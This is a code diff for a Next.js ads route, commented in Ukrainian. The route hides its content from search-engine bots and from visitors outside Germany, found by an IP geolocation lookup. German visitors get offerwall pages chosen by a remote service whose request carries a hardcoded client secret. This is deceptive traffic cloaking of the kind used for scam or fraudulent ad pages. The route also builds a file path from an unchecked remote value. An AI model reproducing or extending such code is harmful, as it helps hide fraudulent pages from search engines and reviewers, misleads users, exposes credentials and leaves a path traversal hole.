@@ -1,4 +1,4 @@
-// /app/api/ads/route.ts (оновлений для Googlebot/юзер логіки)
+// /app/api/ads/route.ts (оновлено: точне визначення країни через ipapi)
 import { NextRequest } from 'next/server';
 import { join } from 'path';
 import { promises as fs } from 'fs';
@@ -31,8 +31,24 @@ export async function GET(req: NextRequest) {
     const ua = req.headers.get('user-agent')?.toLowerCase() || '';
     const isBot = /googlebot|bingbot|yandex|duckduckbot|baiduspider/.test(ua);
 
+    const ipHeader = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for') || '8.8.8.8';
+    const ip = ipHeader.split(',')[0].trim();
+
     if (isBot) {
-        // Повертаємо стандартну Next.js головну для ботів (SSR)
+        return new Response(null, { status: 204 });
+    }
+
+    // Гео-локація через ipapi
+    try {
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geo = await geoRes.json();
+        console.log('IP Info:', geo);
+        const isGerman = geo.country_code === 'DE';
+
+        if (!isGerman) {
+            return new Response(null, { status: 204 });
+        }
+    } catch {
         return new Response(null, { status: 204 });
     }
 
@@ -41,7 +57,6 @@ export async function GET(req: NextRequest) {
         return new Response(null, { status: 200 });
     }
 
-    const ip = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for') || '8.8.8.8';
     const host = req.headers.get('host') || '';
 
     const rawPayload: PayloadMap = {
@@ -57,7 +72,8 @@ export async function GET(req: NextRequest) {
         auth: {
             clientId: 3024,
             clientCompany: 'CQ21WW9U3ehzwXZOKITe',
-            clientSecret: 'MzAyNENRMjFXVzlVM2VoendYWk9LSVRlY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
+            clientSecret:
+                'MzAyNENRMjFXVzlVM2VoendYWk9LSVRlY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
         },
     };
 
@@ -81,7 +97,6 @@ export async function GET(req: NextRequest) {
             return new Response(null, { status: 204 });
         }
 
-        // Обробляємо mode: 3 навіть якщо result === false
         if (result.mode === 3 && result.target) {
             try {
                 const filePath = join(process.cwd(), 'public', 'newgermany_oferwall', result.target);
@@ -113,7 +128,6 @@ export async function GET(req: NextRequest) {
             }
         }
 
-        // Якщо нічого не підходить — редірект на index.html юзеру
         const fallbackPath = join(process.cwd(), 'public', 'newgermany_oferwall', 'index.html');
         try {
             const fallbackHtml = await fs.readFile(fallbackPath, 'utf8');
@@ -124,7 +138,6 @@ export async function GET(req: NextRequest) {
         } catch {
             return new Response('Fallback file not found', { status: 404 });
         }
-
     } catch {
         return new Response('Internal Server Error', { status: 500 });
     }
